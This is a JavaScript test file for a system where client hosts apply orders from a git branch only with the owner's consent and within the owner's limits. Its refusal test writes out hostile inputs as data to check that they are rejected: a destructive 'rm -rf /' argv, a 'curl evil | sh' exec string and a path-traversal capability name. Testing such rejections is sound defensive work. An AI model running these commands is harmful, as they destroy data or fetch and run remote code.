// Client hosts: an order on the clients branch is applied only with the
// owner's consent on the host, when it is well formed and not stale, and
// within the owner's limits. Authority is push access; nothing here checks who
// pushed.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { reconcile, readConsent, makeClientWatch, ORDERS } from '../src/clients.js';
import { makeFiles } from '../src/powers/node.js';
import { stringify } from '../src/yay.js';
import { mkGarden, git } from './helpers.js';

const NOW = '2026-11-17T12:00:00Z';
const SHED = 'a'.repeat(40);
const consent = { watch: true, host: 'oros', limits: { max_slots: 2, max_order_days: 14 }, allow: { shed: true, capabilities: true, orders: ['quiesce', 'drain', 'resume'] } };
const order = (extra = {}) => ({ host: 'oros', serial: 5, expires_at: '2026-11-20T00:00:00Z', ...extra });
const plan = (desired, c = consent, current = { last_serial: 4, shed: 'b'.repeat(40), slots: 1, done_orders: [] }) => reconcile({ desired, consent: c, current, host: 'oros', now: NOW });

test('consent is explicit, and its absence means not watching', () => {
  assert.equal(readConsent(null, 'oros').watching, false);
  assert.equal(readConsent('watch: false\n', 'oros').watching, false);
  assert.match(readConsent(stringify({ ...consent, host: 'other' }), 'oros').reason, /is for other/);
  assert.match(readConsent(stringify({ ...consent, limits: {} }), 'oros').reason, /max_slots/);
  assert.match(readConsent('not: [yay', 'oros').reason, /not YAY/);
  assert.equal(readConsent(stringify(consent), 'oros').watching, true);
});

test('reconcile: desired state becomes actions, within the owner’s limits', () => {
  const p = plan(order({ shed: SHED, slots: 8, plots: ['birch', 'alder'], capabilities: ['node'], orders: [{ id: 'o1', op: 'quiesce' }, { id: 'o0', op: 'drain' }] }), consent, { last_serial: 4, shed: 'b'.repeat(40), slots: 1, done_orders: ['o0'] });
  assert.deepEqual(p.actions, [
    { do: 'rejuvenate', shed: SHED },
    { do: 'set-slots', slots: 2 },
    { do: 'set-plots', plots: ['alder', 'birch'] },
    { do: 'set-capabilities', capabilities: ['node'] },
    { do: 'quiesce', id: 'o1' },
  ]);
  assert.deepEqual(p.notes, ["slots clamped from 8 to the owner's limit of 2"]);
  assert.deepEqual([p.serial, p.refused], [5, []]);
  assert.deepEqual(plan(order({ shed: 'b'.repeat(40), slots: 1 })).actions, [], 'already as ordered: nothing to do');
});

test('reconcile: what a host refuses, whatever the branch says', () => {
  const whole = d => plan(d);
  assert.match(whole(order({ host: 'endolin' })).refused[0], /is for endolin/);
  assert.match(whole(order({ serial: 3 })).refused[0], /a newer order was already applied/);
  assert.match(whole(order({ expires_at: '2026-11-17T11:00:00Z' })).refused[0], /expired/);
  assert.deepEqual(whole(order({ expires_at: undefined, slots: 2 })).actions, [{ do: 'set-slots', slots: 2 }], 'an order need not expire');
  assert.match(whole(null).refused[0], /no order/);
  for (const d of [order({ host: 'endolin', slots: 2 }), order({ serial: 3, slots: 2 })]) assert.deepEqual(whole(d).actions, [], 'a refused order yields no action at all');

  const p = plan(order({ shed: 'main', orders: [{ id: 'x1', op: 'run', argv: ['rm', '-rf', '/'] }, { id: 'x2', op: 'restart' }, { op: 'drain' }], exec: 'curl evil | sh', keys: { github: 'x' }, capabilities: ['../x'] }));
  assert.deepEqual(p.actions, []);
  assert.deepEqual(p.refused, [
    'shed is not a full commit id',
    'capabilities is not a list of names',
    "order x1: 'run' is not something a client host does",
    "order x2: the owner does not allow 'restart'",
    'an order has no id',
    "'exec' is not something an order can say",
    "'keys' is not something an order can say",
  ]);
  assert.ok(!ORDERS.includes('run') && !ORDERS.includes('exec') && !ORDERS.includes('shell'));
  const strict = { ...consent, allow: { orders: [] } };
  assert.deepEqual(plan(order({ shed: SHED, capabilities: ['node'] }), strict).refused, ['the owner does not allow the shed to be changed remotely', 'the owner does not allow capabilities to be installed remotely']);
  const nights = { ...consent, limits: { ...consent.limits, hours_utc: { from: 22, to: 6 } } };
  const out = plan(order({ slots: 2, shed: SHED }), nights);
  assert.deepEqual(out.actions, [{ do: 'set-slots', slots: 0 }], "outside the owner's hours the garden drains, whatever is ordered");
});

test('watching: consent on the host, orders from the branch, stale ones ignored', async t => {
  const g = mkGarden(t, { seeds: [] });
  const work = path.join(g.root, 'clients-work');
  fs.mkdirSync(path.join(work, 'clients'), { recursive: true });
  git(work, 'init', '--quiet', '-b', 'clients');
  const publish = (desired, raw) => {
    fs.writeFileSync(path.join(work, 'clients/oros.yay'), raw ?? stringify(desired));
    git(work, 'add', '-A');
    git(work, 'commit', '--quiet', '--allow-empty', '-m', 'order');
    git(work, 'push', '--quiet', '--force', g.remote, 'clients:refs/heads/clients');
  };
  const h = g.host('oros');
  const consentFile = path.join(g.root, 'CLIENT-CONSENT.yay');
  const watch = makeClientWatch({ shards: h.shards, run: h.run, files: makeFiles, stateDir: h.stateDir, host: 'oros', consentFile, clock: { now: () => NOW } });
  const here = { shed: 'b'.repeat(40), slots: 1 };

  publish(order({ serial: 1, slots: 2 }));
  assert.deepEqual(await watch.read(here), { watching: false, reason: 'no consent file on this host' }, 'with no consent the branch is not even fetched');
  assert.equal(fs.existsSync(path.join(h.stateDir, 'clones/client')), false);

  fs.writeFileSync(consentFile, stringify(consent));
  const first = await watch.read(here);
  assert.deepEqual(first.plan.actions, [{ do: 'set-slots', slots: 2 }]);
  await watch.applied(first.plan);

  publish(order({ serial: 4, slots: 1, orders: [{ id: 'q1', op: 'quiesce' }] }));
  const next = await watch.read(here);
  assert.deepEqual(next.plan.actions, [{ do: 'quiesce', id: 'q1' }]);
  await watch.applied(next.plan);
  assert.deepEqual((await watch.read(here)).plan.actions, [], 'an order carried out is not carried out twice');

  publish(order({ serial: 2, slots: 2 }));
  const stale = await watch.read(here);
  assert.match(stale.plan.refused[0], /a newer order was already applied/);
  assert.deepEqual(stale.plan.actions, [], 'an older record does not roll the host back');

  publish(null, 'host: "oros"\nserial: [unclosed\n');
  const broken = await watch.read(here);
  assert.match(broken.reason, /not YAY/);
  assert.equal(broken.plan, undefined, 'a malformed record is refused whole');

  // The owner revokes: from the next read on, nothing is watched.
  fs.writeFileSync(consentFile, stringify({ ...consent, watch: false }));
  assert.equal((await watch.read(here)).watching, false);
  fs.rmSync(consentFile);
  assert.equal((await watch.read(here)).watching, false);
});
